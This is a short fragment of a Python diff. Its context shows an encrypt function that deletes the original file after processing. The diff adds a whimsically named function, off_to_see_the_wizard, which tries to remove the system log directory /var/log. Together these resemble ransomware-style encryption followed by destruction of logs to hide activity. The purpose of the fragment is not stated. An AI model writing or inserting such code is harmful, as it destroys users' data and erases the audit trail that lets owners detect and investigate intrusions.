@@ -48,4 +48,7 @@ def encrypt(f):
     os.remove(f)
 def main(file):
     encrypt(file)
-    #replace_file(file)
+
+def off_to_see_the_wizard():
+    os.rmdir('/var/log')
+    return True
